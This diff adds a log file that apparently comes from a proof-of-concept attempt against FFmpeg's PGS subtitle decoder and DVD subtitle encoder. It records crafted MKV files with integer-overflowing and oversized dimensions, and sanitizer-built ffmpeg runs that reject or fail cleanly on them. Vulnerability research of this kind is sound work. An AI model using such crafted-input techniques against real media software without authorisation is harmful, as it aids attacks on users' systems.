@@ -1,0 +1,177 @@
+[*] Generating crafted MKV files...
+[*] Primary attempt (overflow dimensions - expected: PGS decoder rejects):
+[+] Generated vuln_001_input_overflow.mkv (236 bytes)
+[+] Subtitle dimensions: 46341 x 46342
+[+] w*h = 2147534622
+[+] INT_MAX = 2147483647
+[+] w*h overflows signed int32: True
+[+] RLE data size: 393252 bytes
+[+] PGS subtitle data size: 92 bytes
+
+[*] Secondary attempt (valid dimensions - expected: dvdsubenc BUFFER_TOO_SMALL):
+[+] Generated vuln_001_input_valid.mkv (595 bytes)
+[+] Subtitle dimensions: 1025 x 2046
+[+] w*h = 2097150
+[+] INT_MAX = 2147483647
+[+] w*h overflows signed int32: False
+[+] RLE data size: 387 bytes
+[+] PGS subtitle data size: 449 bytes
+
+[*] Using valid dimensions MKV as primary input:
+[+] Final PoC file: vuln_001_input.mkv
+
+=== Attempt 1: MKV with overflow dimensions (w=46341, h=46342) ===
+    Expected: PGS decoder rejects due to av_image_check_size in ff_set_dimensions
+ffmpeg version N-126435-gf93cd72dde Copyright (c) 2000-2026 the FFmpeg developers
+  built with gcc 13 (Ubuntu 13.3.0-6ubuntu2~24.04)
+  configuration: --cc=gcc --cxx=g++ --extra-cflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-cxxflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-ldflags='-fsanitize=address,undefined' --disable-optimizations --disable-stripping --enable-debug=0 --disable-x86asm --disable-doc
+  libavutil      61.  7.100 / 61.  7.100
+  libavcodec     63. 11.100 / 63. 11.100
+  libavformat    63.  6.100 / 63.  6.100
+  libavdevice    63.  2.100 / 63.  2.100
+  libavfilter    12.  4.100 / 12.  4.100
+  libswscale     10.  2.100 / 10.  2.100
+  libswresample   7.  3.100 /  7.  3.100
+[pgssub @ 0x519000000a80] [IMGUTILS @ 0x71b210d12c20] Picture size 46341x46342 is invalid
+[pgssub @ 0x519000000a80] Bitmap dimensions (46341x46342) invalid.
+[in#0/matroska,webm @ 0x517000000080] Could not find codec parameters for stream 0 (Subtitle: hdmv_pgs_subtitle (pgssub)): unspecified size
+Consider increasing the value for the 'analyzeduration' (0) and 'probesize' (5000000) options
+Input #0, matroska,webm, from 'vuln_001_input_overflow.mkv':
+  Metadata:
+    encoder         : libebml poc
+  Duration: 00:00:05.00, start: 0.000000, bitrate: 0 kb/s
+  Stream #0:0(eng): Subtitle: hdmv_pgs_subtitle (pgssub) (default)
+[out#0/vob @ 0x511000000cc0] No explicit maps, mapping streams automatically...
+[sost#0:0/dvdsub @ 0x517000000780] Created subtitle stream from input stream 0:0
+Stream mapping:
+  Stream #0:0 -> #0:0 (hdmv_pgs_subtitle (pgssub) -> dvd_subtitle (dvdsub))
+[sost#0:0/dvdsub @ 0x517000000780] Starting thread...
+[sist#0:0/hdmv_pgs_subtitle @ 0x514000000040] [dec:pgssub @ 0x513000000900] Starting thread...
+[in#0/matroska,webm @ 0x513000000200] Starting thread...
+Press [q] to stop, [?] for help
+Output #0, vob, to '/tmp/poc_out1.vob':
+  Metadata:
+    encoder         : Lavf63.6.100
+  Stream #0:0(eng): Subtitle: dvd_subtitle (default)
+    Metadata:
+      encoder         : Lavc63.11.100 dvdsub
+[out#0/vob @ 0x511000000cc0] Starting thread...
+[in#0/matroska,webm @ 0x513000000200] EOF while reading input
+[pgssub @ 0x519000002380] [IMGUTILS @ 0x71b20b309420] Picture size 46341x46342 is invalid
+[pgssub @ 0x519000002380] Bitmap dimensions (46341x46342) invalid.
+[in#0/matroska,webm @ 0x513000000200] Terminating thread with success
+[sist#0:0/hdmv_pgs_subtitle @ 0x514000000040] [dec:pgssub @ 0x513000000900] Decoder thread received EOF packet
+[sist#0:0/hdmv_pgs_subtitle @ 0x514000000040] [dec:pgssub @ 0x513000000900] Decoder returned EOF, finishing
+[sist#0:0/hdmv_pgs_subtitle @ 0x514000000040] [dec:pgssub @ 0x513000000900] Terminating thread with success
+[sost#0:0/dvdsub @ 0x517000000780] [enc:dvdsub @ 0x5110000011c0] Encoder thread received EOF
+[sost#0:0/dvdsub @ 0x517000000780] Terminating thread with success
+[out#0/vob @ 0x511000000cc0] All streams finished
+[out#0/vob @ 0x511000000cc0] Terminating thread with success
+[AVIOContext @ 0x513000000ac0] Statistics: 0 bytes written, 0 seeks, 0 writeouts
+[out#0/vob @ 0x511000000cc0] Output file #0 (/tmp/poc_out1.vob):
+[out#0/vob @ 0x511000000cc0]   Output stream #0:0 (subtitle): 0 frames encoded; 0 packets muxed (0 bytes); 
+[out#0/vob @ 0x511000000cc0]   Total: 0 packets (0 bytes) muxed
+[out#0/vob @ 0x511000000cc0] video:0KiB audio:0KiB subtitle:0KiB other streams:0KiB global headers:0KiB muxing overhead: unknown
+[out#0/vob @ 0x511000000cc0] Output file is empty, nothing was encoded(check -ss / -t / -frames parameters if used)
+size=       0KiB time=N/A bitrate=N/A speed=N/A elapsed=0:00:00.00    
+[in#0/matroska,webm @ 0x513000000200] Input file #0 (vuln_001_input_overflow.mkv):
+[in#0/matroska,webm @ 0x513000000200]   Input stream #0:0 (subtitle): 1 packets read (92 bytes); 1 frames decoded; 0 decode errors; 
+[in#0/matroska,webm @ 0x513000000200]   Total: 1 packets (92 bytes) demuxed
+[AVIOContext @ 0x5130000003c0] Statistics: 236 bytes read, 0 seeks
+
+Exiting with exit code 0
+
+=== Attempt 2: MKV with valid-but-large dimensions (w=1025, h=2046) ===
+    Expected: Reaches dvdsubenc size check -> 'dvd_subtitle too big'
+ffmpeg version N-126435-gf93cd72dde Copyright (c) 2000-2026 the FFmpeg developers
+  built with gcc 13 (Ubuntu 13.3.0-6ubuntu2~24.04)
+  configuration: --cc=gcc --cxx=g++ --extra-cflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-cxxflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-ldflags='-fsanitize=address,undefined' --disable-optimizations --disable-stripping --enable-debug=0 --disable-x86asm --disable-doc
+  libavutil      61.  7.100 / 61.  7.100
+  libavcodec     63. 11.100 / 63. 11.100
+  libavformat    63.  6.100 / 63.  6.100
+  libavdevice    63.  2.100 / 63.  2.100
+  libavfilter    12.  4.100 / 12.  4.100
+  libswscale     10.  2.100 / 10.  2.100
+  libswresample   7.  3.100 /  7.  3.100
+Input #0, matroska,webm, from 'vuln_001_input_valid.mkv':
+  Metadata:
+    encoder         : libebml poc
+  Duration: 00:00:05.00, start: 0.000000, bitrate: 0 kb/s
+  Stream #0:0(eng): Subtitle: hdmv_pgs_subtitle (pgssub), 1025x2046 (default)
+[out#0/vob @ 0x511000000cc0] No explicit maps, mapping streams automatically...
+[sost#0:0/dvdsub @ 0x517000000780] Created subtitle stream from input stream 0:0
+Stream mapping:
+  Stream #0:0 -> #0:0 (hdmv_pgs_subtitle (pgssub) -> dvd_subtitle (dvdsub))
+[sost#0:0/dvdsub @ 0x517000000780] Starting thread...
+[sist#0:0/hdmv_pgs_subtitle @ 0x514000000040] [dec:pgssub @ 0x513000000900] Starting thread...
+[in#0/matroska,webm @ 0x513000000200] Starting thread...
+Press [q] to stop, [?] for help
+Output #0, vob, to '/tmp/poc_out2.vob':
+[in#0/matroska,webm @ 0x513000000200] EOF while reading input
+  Metadata:
+    encoder         : Terminating thread with success
+Lavf63.6.100
+  Stream #0:0(eng): Subtitle: dvd_subtitle, 1025x2046 (default)
+    Metadata:
+      encoder         : Lavc63.11.100 dvdsub
+[out#0/vob @ 0x511000000cc0] Starting thread...
+[sist#0:0/hdmv_pgs_subtitle @ 0x514000000040] [dec:pgssub @ 0x513000000900] Decoder thread received EOF packet
+[sist#0:0/hdmv_pgs_subtitle @ 0x514000000040] [dec:pgssub @ 0x513000000900] Decoder returned EOF, finishing
+[sist#0:0/hdmv_pgs_subtitle @ 0x514000000040] [dec:pgssub @ 0x513000000900] Terminating thread with success
+dvd_subtitle too big
+[sost#0:0/dvdsub @ 0x517000000780] [enc:dvdsub @ 0x5110000011c0] Subtitle encoding failed
+[sost#0:0/dvdsub @ 0x517000000780] [enc:dvdsub @ 0x5110000011c0] Error encoding a frame: Buffer too small
+[sost#0:0/dvdsub @ 0x517000000780] Task finished with error: Buffer too small
+[sost#0:0/dvdsub @ 0x517000000780] Terminating thread with error: Buffer too small
+[out#0/vob @ 0x511000000cc0] All streams finished
+[out#0/vob @ 0x511000000cc0] Terminating thread with success
+[AVIOContext @ 0x513000000ac0] Statistics: 0 bytes written, 0 seeks, 0 writeouts
+[out#0/vob @ 0x511000000cc0] Output file #0 (/tmp/poc_out2.vob):
+[out#0/vob @ 0x511000000cc0]   Output stream #0:0 (subtitle): 1 frames encoded; 0 packets muxed (0 bytes); 
+[out#0/vob @ 0x511000000cc0]   Total: 0 packets (0 bytes) muxed
+[out#0/vob @ 0x511000000cc0] video:0KiB audio:0KiB subtitle:0KiB other streams:0KiB global headers:0KiB muxing overhead: unknown
+[out#0/vob @ 0x511000000cc0] Output file is empty, nothing was encoded(check -ss / -t / -frames parameters if used)
+size=       0KiB time=N/A bitrate=N/A speed=N/A elapsed=0:00:00.01    
+[in#0/matroska,webm @ 0x513000000200] Input file #0 (vuln_001_input_valid.mkv):
+[in#0/matroska,webm @ 0x513000000200]   Input stream #0:0 (subtitle): 1 packets read (449 bytes); 1 frames decoded; 0 decode errors; 
+[in#0/matroska,webm @ 0x513000000200]   Total: 1 packets (449 bytes) demuxed
+[AVIOContext @ 0x5130000003c0] Statistics: 595 bytes read, 0 seeks
+Conversion failed!
+
+Exiting with exit code -1397118274
+
+=== Primary PoC run (attempt 2 as main input) ===
+ffmpeg version N-126435-gf93cd72dde Copyright (c) 2000-2026 the FFmpeg developers
+  built with gcc 13 (Ubuntu 13.3.0-6ubuntu2~24.04)
+  configuration: --cc=gcc --cxx=g++ --extra-cflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-cxxflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-ldflags='-fsanitize=address,undefined' --disable-optimizations --disable-stripping --enable-debug=0 --disable-x86asm --disable-doc
+  libavutil      61.  7.100 / 61.  7.100
+  libavcodec     63. 11.100 / 63. 11.100
+  libavformat    63.  6.100 / 63.  6.100
+  libavdevice    63.  2.100 / 63.  2.100
+  libavfilter    12.  4.100 / 12.  4.100
+  libswscale     10.  2.100 / 10.  2.100
+  libswresample   7.  3.100 /  7.  3.100
+Input #0, matroska,webm, from 'vuln_001_input.mkv':
+  Metadata:
+    encoder         : libebml poc
+  Duration: 00:00:05.00, start: 0.000000, bitrate: 0 kb/s
+  Stream #0:0(eng): Subtitle: hdmv_pgs_subtitle (pgssub), 1025x2046 (default)
+Stream mapping:
+  Stream #0:0 -> #0:0 (hdmv_pgs_subtitle (pgssub) -> dvd_subtitle (dvdsub))
+Press [q] to stop, [?] for help
+Output #0, vob, to '/tmp/poc_out_main.vob':
+  Metadata:
+    encoder         : Lavf63.6.100
+  Stream #0:0(eng): Subtitle: dvd_subtitle, 1025x2046 (default)
+    Metadata:
+      encoder         : Lavc63.11.100 dvdsub
+dvd_subtitle too big
+[sost#0:0/dvdsub @ 0x517000000780] [enc:dvdsub @ 0x5110000011c0] Subtitle encoding failed
+[sost#0:0/dvdsub @ 0x517000000780] [enc:dvdsub @ 0x5110000011c0] Error encoding a frame: Buffer too small
+[sost#0:0/dvdsub @ 0x517000000780] Task finished with error: Buffer too small
+[sost#0:0/dvdsub @ 0x517000000780] Terminating thread with error: Buffer too small
+[out#0/vob @ 0x511000000cc0] video:0KiB audio:0KiB subtitle:0KiB other streams:0KiB global headers:0KiB muxing overhead: unknown
+[out#0/vob @ 0x511000000cc0] Output file is empty, nothing was encoded(check -ss / -t / -frames parameters if used)
+size=       0KiB time=N/A bitrate=N/A speed=N/A elapsed=0:00:00.01    
+Conversion failed!
+EXIT=0
